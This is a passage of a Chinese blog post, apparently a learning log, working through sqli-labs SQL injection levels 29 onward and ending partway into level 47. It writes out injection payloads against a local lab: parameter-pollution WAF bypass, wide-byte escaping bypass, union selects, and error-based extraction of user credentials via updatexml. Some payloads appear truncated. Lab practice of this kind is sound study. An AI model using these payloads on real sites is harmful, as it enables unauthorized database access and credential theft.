<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta name="description" content="">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        sqli-lab:Less29-53记录 - YYHYlh&#39;s blog
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>

    









<meta name="generator" content="Hexo 6.3.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> 常记常新 </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>YYHYlh</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-29"><span class="toc-text">Less-29</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%8F%97WAF%E4%BF%9D%E6%8A%A4%E5%8D%95%E5%BC%95%E5%8F%B7%E6%B3%A8%E5%85%A5"><span class="toc-text">GET受WAF保护单引号注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-30"><span class="toc-text">Less-30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%8F%97WAF%E4%BF%9D%E6%8A%A4%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%B3%A8%E5%85%A5"><span class="toc-text">GET受WAF保护双引号注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-31"><span class="toc-text">Less-31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%8F%97WAF%E4%BF%9D%E6%8A%A4%E6%8B%AC%E5%8F%B7%E6%B3%A8%E5%85%A5"><span class="toc-text">GET受WAF保护括号注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-32"><span class="toc-text">Less-32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Baddslashes%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-text">GET字符型addslashes绕过注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-33"><span class="toc-text">Less-33</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Baddslashes%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5-1"><span class="toc-text">GET字符型addslashes绕过注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-34"><span class="toc-text">Less-34</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%AD%97%E7%AC%A6%E5%9E%8Baddslashes%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-text">POST字符型addslashes绕过注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-35"><span class="toc-text">Less-35</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8Baddslashes%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-text">GET数字型addslashes绕过注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-36"><span class="toc-text">Less-36</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Bmysql-real-escape-string%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-text">GET字符型mysql_real_escape_string绕过注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-37"><span class="toc-text">Less-37</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%AD%97%E7%AC%A6%E5%9E%8Bmysql-real-escape-string%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-text">POST字符型mysql_real_escape_string绕过注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-38"><span class="toc-text">Less-38</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">GET字符型层次化查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-39"><span class="toc-text">Less-39</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8B%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">GET数字型层次化查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-40"><span class="toc-text">Less-40</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%8B%AC%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="toc-text">GET括号字符型层次化查询盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-41"><span class="toc-text">Less-41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8B%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="toc-text">GET数字型层次化查询盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-42"><span class="toc-text">Less-42</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%9A%84%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">POST字符型基于错误的的层次化查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-43"><span class="toc-text">Less-43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%8A%A0%E6%8B%AC%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%9A%84%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">POST加括号字符型基于错误的的层次化查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-44"><span class="toc-text">Less-44</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="toc-text">POST字符型层次化查询盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-45"><span class="toc-text">Less-45</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E6%8B%AC%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="toc-text">POST括号字符型层次化查询盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-46"><span class="toc-text">Less-46</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8B%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84orderby%E4%BB%8E%E5%8F%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">GET数字型基于错误的orderby从句注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-47"><span class="toc-text">Less-47</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84orderby%E4%BB%8E%E5%8F%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">GET字符型基于错误的orderby从句注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-48"><span class="toc-text">Less-48</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8B%E7%9A%84orderby%E4%BB%8E%E5%8F%A5%E7%9B%B2%E6%B3%A8"><span class="toc-text">GET数字型的orderby从句盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-49"><span class="toc-text">Less-49</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Borderby%E4%BB%8E%E5%8F%A5%E7%9B%B2%E6%B3%A8"><span class="toc-text">GET字符型orderby从句盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-50"><span class="toc-text">Less-50</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8Borderby%E4%BB%8E%E5%8F%A5%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">GET数字型orderby从句层次化查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-51"><span class="toc-text">Less-51</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Borderby%E4%BB%8E%E5%8F%A5%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">GET字符型orderby从句层次化查询注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-52"><span class="toc-text">Less-52</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8Borderby%E4%BB%8E%E5%8F%A5%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="toc-text">GET数字型orderby从句层次化查询盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-53"><span class="toc-text">Less-53</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Borderby%E4%BB%8E%E5%8F%A5%E5%B1%82%E6%AC%A1%E5%8C%96%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="toc-text">GET字符型orderby从句层次化查询盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 常记常新 </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        sqli-lab:Less29-53记录
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2017-12-09 08:30:17</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content no-indent">
        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近开始学习注入，从sqli-lab的题入手。前面1-28是跟着教程做的，学习了注入基本的方法和思路。后面试着自己做一下，同时留下思路和笔记。</p>
<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><h3 id="GET受WAF保护单引号注入"><a href="#GET受WAF保护单引号注入" class="headerlink" title="GET受WAF保护单引号注入"></a>GET受WAF保护单引号注入</h3><p>测试：</p>
<p><img src="/img/sql/21.png"></p>
<p>结果跳转到了另一个页面,结合登录网站的图片提示，我们知道有waf。看看源码。</p>
<p><img src="/img/sql/12.png"></p>
<p>看看<code>java_implimentation</code>和<code>whitelist</code>这个两个处理传入参数的函数。</p>
<p><img src="/img/sql/1.png"></p>
<p>java_implimentation用来解析查询字符串，用<code>&amp;</code>分割参数，并只返回参数<code>id</code>的值且只返回第一次。</p>
<p><img src="/img/sql/guolv.png"></p>
<p>这是主要的检测函数，检测传入的参数是否是一个纯数字，如果不是，则判定为非法字符，跳转到特殊页面。</p>
<p>根据WAF规则构造出payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-29/login.php?id=0%5C&id=0%E2%80%98">http://localhost/Less-29/login.php?id=0\&amp;id=0‘</a>“) union select 1,2,3 –+</p>
</blockquote>
<p>前一个<code>id=0</code>用于绕过waf，而代码中执行的sql语句使用的是<code>$_GET[&#39;id&#39;]</code>,这个值取的是最后一个GET的id的值，也就是payload中&amp;后面的id的值。</p>
<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><h3 id="GET受WAF保护双引号注入"><a href="#GET受WAF保护双引号注入" class="headerlink" title="GET受WAF保护双引号注入"></a>GET受WAF保护双引号注入</h3><p>这一关跟上一关差不多，区别在于sql语句使用的参数加了双引号。如下payload可以检测出：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-30/login.php?id=1%5C&id=1%22">http://localhost/Less-30/login.php?id=1\&amp;id=1%22</a>“</p>
</blockquote>
<p><img src="/img/sql/error.png"></p>
<p>构造payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-30/login.php?id=1%5C&id=0%22%20union%20select%201,2,3%20--+">http://localhost/Less-30/login.php?id=1\&amp;id=0%22%20union%20select%201,2,3%20--+</a>“</p>
</blockquote>
<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><h3 id="GET受WAF保护括号注入"><a href="#GET受WAF保护括号注入" class="headerlink" title="GET受WAF保护括号注入"></a>GET受WAF保护括号注入</h3><p>跟上面大同小异,从报错可以看出参数闭合的方式。 &amp;#x20;<br>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-31/login.php?id=1%5C&id=0%22)%20union%20select%201,2,3%20--+%22)%20union%20select%201,2,3%20--+">http://localhost/Less-31/login.php?id=1\&amp;id=0%22)%20union%20select%201,2,3%20--+&quot;)%20union%20select%201,2,3%20--+</a>)</p>
</blockquote>
<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><h3 id="GET字符型addslashes绕过注入"><a href="#GET字符型addslashes绕过注入" class="headerlink" title="GET字符型addslashes绕过注入"></a>GET字符型addslashes绕过注入</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-32/?id=1%EF%BF%BD%27">http://localhost/Less-32/?id=1%df%27</a>“</p>
</blockquote>
<p><img src="/img/sql/error1.png"></p>
<p>从报错看出单引号被添加了一个斜杠。</p>
<p>源码：</p>
<p><img src="/img/sql/so.png"></p>
<p><code>check_addslashes</code>函数：</p>
<p><img src="/img/sql/han.png"></p>
<p>参数经过<code>check_addslashes</code>函数处理，斜杠和单双引号都被添加了斜杠转义。看到执行了<code>SET NAMES gbk</code>，想到可以使用宽字节注入绕过。</p>
<p>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-32/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-32/?id=0%df%27%20union%20select%201,2,3%20--+</a>“</p>
</blockquote>
<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><h3 id="GET字符型addslashes绕过注入-1"><a href="#GET字符型addslashes绕过注入-1" class="headerlink" title="GET字符型addslashes绕过注入"></a>GET字符型addslashes绕过注入</h3><p>和Less-32注入方法一模一样，查看源码区别在于<code>check_addslashes</code>使用了php自带的函数<code>addslashes</code>，观察实际使用效果结合查询手册，学习了addslashes函数的原理。和绕过方法。</p>
<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><h3 id="POST字符型addslashes绕过注入"><a href="#POST字符型addslashes绕过注入" class="headerlink" title="POST字符型addslashes绕过注入"></a>POST字符型addslashes绕过注入</h3><p>和之前GET的原理相同。区别在于数据改为POST传输。</p>
<p>在测试中，我直接用浏览器输入<code>1%df&#39;</code>不会报错，只有在bp的repeater中修改payload再POST出去才会报错。</p>
<p>使用bp抓包发现，在浏览器中POST的<code>1%df&#39;</code>会被编码为<code>1%25df</code>，即<code>%</code>被编码了。这样就无法构成宽字节了。</p>
<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><h3 id="GET数字型addslashes绕过注入"><a href="#GET数字型addslashes绕过注入" class="headerlink" title="GET数字型addslashes绕过注入"></a>GET数字型addslashes绕过注入</h3><p>测试：</p>
<p><code>http://localhost/Less-35/?id=1%df%27</code></p>
<p>报错：</p>
<p><img src="/img/sql/error2.png"></p>
<p>源码：</p>
<p><img src="/img/sql/sou2.png"></p>
<p>发现是数字型的id，那么在注入时addslashes函数就不会起到什 &amp;#x20;<br>么作用。</p>
<p>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+">http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+</a>“</p>
</blockquote>
<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><h3 id="GET字符型mysql-real-escape-string绕过注入"><a href="#GET字符型mysql-real-escape-string绕过注入" class="headerlink" title="GET字符型mysql_real_escape_string绕过注入"></a>GET字符型mysql_real_escape_string绕过注入</h3><p>跟前几题类似，区别在于转义字符串的函数换成了<code>mysql_real_escape_string</code>,在参考手册中查一下。</p>
<p><img src="/img/sql/mysql_escape.png"></p>
<p>注入方法和之前的一样。</p>
<p>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-36/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-36/?id=0%df%27%20union%20select%201,2,3%20--+</a>“</p>
</blockquote>
<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><h3 id="POST字符型mysql-real-escape-string绕过注入"><a href="#POST字符型mysql-real-escape-string绕过注入" class="headerlink" title="POST字符型mysql_real_escape_string绕过注入"></a>POST字符型mysql_real_escape_string绕过注入</h3><p>只是换了转义函数，注入方法同Less-34。</p>
<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><h3 id="GET字符型层次化查询注入"><a href="#GET字符型层次化查询注入" class="headerlink" title="GET字符型层次化查询注入"></a>GET字符型层次化查询注入</h3><p>源码：</p>
<p><img src="/img/sql/stacked.png"></p>
<p>代码使用了<code>mysqli</code>拓展连接数据库的方式。<code>mysqli_multi_query</code>执行多个sql语句，以<code>；</code>分隔。<code>mysqli_more_results</code>检查是否还有查询数据。</p>
<p>payload：</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+">http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+</a>“</p>
<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><h3 id="GET数字型层次化查询注入"><a href="#GET数字型层次化查询注入" class="headerlink" title="GET数字型层次化查询注入"></a>GET数字型层次化查询注入</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+">http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+</a>“</p>
</blockquote>
<p>报错：</p>
<p><img src="/img/sql/error3.png"></p>
<p>判断应为数字型注入</p>
<p>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+">http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+</a>“</p>
</blockquote>
<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><h3 id="GET括号字符型层次化查询盲注"><a href="#GET括号字符型层次化查询盲注" class="headerlink" title="GET括号字符型层次化查询盲注"></a>GET括号字符型层次化查询盲注</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-40/index.php?id=0%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+%22)%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+&quot;)%20or%201=1%20--+</a>)</p>
</blockquote>
<p>前两个无回显，第三个登陆成功。</p>
<p>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+%22)%20union%20select%201,2,3%20--+">http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+&quot;)%20union%20select%201,2,3%20--+</a>)</p>
</blockquote>
<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><h3 id="GET数字型层次化查询盲注"><a href="#GET数字型层次化查询盲注" class="headerlink" title="GET数字型层次化查询盲注"></a>GET数字型层次化查询盲注</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-41/?id=0%27%20or%201=1%20--+">http://localhost/Less-41/?id=0%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-41/?id=0%20or%201=1%20--+">http://localhost/Less-41/?id=0%20or%201=1%20--+</a>“</p>
</blockquote>
<p>判定为数字型注入</p>
<p>payload:</p>
<blockquote>
<p>localhost&#x2F;Less-41&#x2F;?id&#x3D;0 union select 1,2,3 –+</p>
</blockquote>
<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><h3 id="POST字符型基于错误的的层次化查询注入"><a href="#POST字符型基于错误的的层次化查询注入" class="headerlink" title="POST字符型基于错误的的层次化查询注入"></a>POST字符型基于错误的的层次化查询注入</h3><p>源码：</p>
<p><img src="/img/sql/escape0.png"></p>
<p>转义了用户名但没有转义密码，联想到之前Less-24的二次注入。但是发现这次不让注册了。。。看到会报错，尝试使用less-27学的基于报错的<code>updatexml</code>语法。</p>
<p>payload:</p>
<blockquote>
<p>login_user&#x3D;root&amp;login_password&#x3D;1’ or updatexml(1,concat(0x2829,(select version())),1) –+&amp;mysubmit&#x3D;Login</p>
<p>login_user&#x3D;root&amp;login_password&#x3D;1’ or extractvalue(1,concat(0x2829,(select version()),1) –+&amp;mysubmit&#x3D;Login</p>
<p>login_user&#x3D;root&amp;login_password&#x3D;1’ or updatexml(1,concat(0x2829,(select concat_ws(‘:’,id,username,password) from users limit 0,1)),1) –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<p>之后就可以登陆改密码啦。</p>
<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><h3 id="POST加括号字符型基于错误的的层次化查询注入"><a href="#POST加括号字符型基于错误的的层次化查询注入" class="headerlink" title="POST加括号字符型基于错误的的层次化查询注入"></a>POST加括号字符型基于错误的的层次化查询注入</h3><p>测试：</p>
<blockquote>
<p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p>
<p>login_user&#x3D;root&amp;login_password&#x3D;0’) or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<p>测试出sql语句是<code>&#39;)</code>闭合，payload与上题类似。</p>
<blockquote>
<p>login_user&#x3D;root&amp;login_password&#x3D;1’） or updatexml(1,concat(0x2829,(select version())),1) –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><h3 id="POST字符型层次化查询盲注"><a href="#POST字符型层次化查询盲注" class="headerlink" title="POST字符型层次化查询盲注"></a>POST字符型层次化查询盲注</h3><p>测试：</p>
<blockquote>
<p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p>
<p>login_user&#x3D;root&amp;login_password&#x3D;0” or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<p>发现这题没有回显了，使用boolenBased盲注。</p>
<p>payload:</p>
<blockquote>
<p>64 –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<p>可以写脚本跑或是sqlmap跑</p>
<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><h3 id="POST括号字符型层次化查询盲注"><a href="#POST括号字符型层次化查询盲注" class="headerlink" title="POST括号字符型层次化查询盲注"></a>POST括号字符型层次化查询盲注</h3><p>测试：</p>
<blockquote>
<p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p>
<p>login_user&#x3D;root&amp;login_password&#x3D;0’) or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<p>测试出sql语句是<code>&#39;)</code>闭合，payload与上题类似。</p>
<p>payload：</p>
<blockquote>
<p>64 –+&amp;mysubmit&#x3D;Login</p>
</blockquote>
<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><h3 id="GET数字型基于错误的orderby从句注入"><a href="#GET数字型基于错误的orderby从句注入" class="headerlink" title="GET数字型基于错误的orderby从句注入"></a>GET数字型基于错误的orderby从句注入</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a>“</p>
</blockquote>
<p>判断为数字型注入</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%20%20desc">http://localhost/Less-46/?sort=1%20%20desc</a>“</p>
</blockquote>
<p>orderby从句注入</p>
<p>源码：</p>
<p><img src="/img/sql/order.png"></p>
<p><code>order by</code>从句的注入，查了一下，感觉跟之前的也是大同小异。有报错还是可以使用<code>updatexml</code>或是<code>extractvalue</code>。</p>
<p>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a>“</p>
</blockquote>
<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><h3 id="GET字符型基于错误的orderby从句注入"><a href="#GET字符型基于错误的orderby从句注入" class="headerlink" title="GET字符型基于错误的orderby从句注入"></a>GET字符型基于错误的orderby从句注入</h3><p>测试：</p>
<blockquote>
